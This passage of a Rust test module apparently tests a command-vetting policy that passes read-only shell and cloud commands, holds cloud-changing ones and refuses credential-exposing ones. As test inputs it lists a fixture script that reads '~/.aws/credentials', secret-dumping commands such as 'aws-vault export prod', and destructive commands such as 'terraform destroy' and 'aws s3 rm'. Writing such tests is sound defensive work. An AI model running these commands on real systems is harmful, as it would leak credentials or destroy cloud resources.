            "aws s3 ls",
            "kubectl get pods",
            "env FOO=1 cargo test",
            "printenv PATH",
            "terraform output",
            "aws ssm get-parameter --name /app/region",
        ] {
            assert!(
                refused(command).is_empty(),
                "{command}: {:?}",
                refused(command)
            );
        }
    }

    #[test]
    fn a_secret_named_in_a_command_is_known() {
        let found = assess(
            "curl -s -H \"Authorization: Bearer $API_TOKEN\" -b \"s=${DASHBOARD_SESSION}\" https://x.example.com/api",
            Path::new("/nonexistent"),
            &Policy::default(),
        );
        assert_eq!(found.secrets, ["API_TOKEN", "DASHBOARD_SESSION"]);
        assert!(found.refused.is_empty());
        assert!(
            assess("echo $HOME", Path::new("/"), &Policy::default())
                .secrets
                .is_empty()
        );
    }

    #[test]
    fn a_command_handed_credentials_is_judged_as_itself() {
        assert!(held("aws-vault exec prod -- aws s3 ls").is_empty());
        assert!(held("aws-vault exec prod aws sts get-caller-identity").is_empty());
        assert!(!held("aws-vault exec prod -- aws s3 rm s3://bucket/x").is_empty());
        assert!(!held("saml2aws exec --exec-profile p -- terraform apply").is_empty());
        for command in [
            "op run -- env",
            "doppler run -- printenv",
            "aws-vault export prod",
            "aws-vault login prod",
            "saml2aws script",
        ] {
            assert!(!refused(command).is_empty(), "{command}");
        }
        // The command inside gets the keys it reads.
        let all: Vec<(OsString, OsString)> = [("AWS_SECRET_ACCESS_KEY", "aws-secret-value")]
            .map(|(n, v)| (OsString::from(n), OsString::from(v)))
            .to_vec();
        let env = environment(
            &all,
            "aws-vault exec prod -- aws s3 ls",
            Path::new("/"),
            &[],
        );
        assert_eq!(env.len(), 1);
    }

    #[test]
    fn a_shell_script_of_the_project_is_read_before_it_runs() {
        let dir = committed(&[
            (
                "deploy.sh",
                "#!/bin/sh\n# Publish the site.\nnpm run build\naws s3 sync dist s3://site \\\n  --delete\n",
            ),
            ("leak.sh", "cat ~/.aws/credentials\n"),
            ("check.sh", "aws s3 ls\necho \"$API_TOKEN\" >/dev/null\n"),
        ]);
        let root = dir.path();

        let deploy = assess("./deploy.sh", root, &Policy::default());
        assert_eq!(
            deploy.held,
            ["deploy.sh: it changes something in a cloud account"]
        );
        assert_eq!(
            assess("sh leak.sh", root, &Policy::default()).refused,
            ["leak.sh: it reads or touches a file of secrets"]
        );
        let check = assess("bash check.sh", root, &Policy::default());
        assert!(check.held.is_empty());
        assert_eq!(check.secrets, ["API_TOKEN"]);
        // It gets the keys of the tools it runs.
        let all: Vec<(OsString, OsString)> = [("AWS_SECRET_ACCESS_KEY", "aws-secret-value")]
            .map(|(n, v)| (OsString::from(n), OsString::from(v)))
            .to_vec();
        assert_eq!(environment(&all, "bash check.sh", root, &[]).len(), 1);
        assert!(environment(&all, "bash leak.sh", root, &[]).is_empty());
    }

    #[test]
    fn cloud_commands_that_only_read_run_and_the_rest_waits() {
        for command in [
            "aws sts get-caller-identity",
            "aws --profile prod --region eu-west-1 ec2 describe-instances",
            "aws s3 ls s3://bucket/logs/",
            "aws s3 cp s3://bucket/report.csv ./report.csv",
            "aws logs tail /app/api --since 1h",
            "aws dynamodb query --table-name t --key-condition-expression x",
            "gcloud compute instances list",
            "gcloud config list",
            "az vm list",
            "az account show",
            "terraform plan",
            "terraform output",
            "pulumi preview",
        ] {
            assert!(held(command).is_empty(), "{command}: {:?}", held(command));
        }
        for command in [
            "aws s3 rm s3://bucket/x",
            "aws s3 cp ./dump.sql s3://bucket/",
            "aws s3 sync s3://a s3://b",
            "aws ec2 terminate-instances --instance-ids i-1",
            "aws iam create-access-key --user-name x",
            "aws lambda invoke --function-name f out.json",
            "gcloud compute instances delete vm-1",
            "gcloud config set project other",
            "az vm delete -n vm-1 -g rg",
            "terraform apply -auto-approve",
            "terraform destroy",
            "terraform state rm aws_instance.x",
            "pulumi up --yes",
        ] {
            assert!(!held(command).is_empty(), "{command}");
        }
    }
}
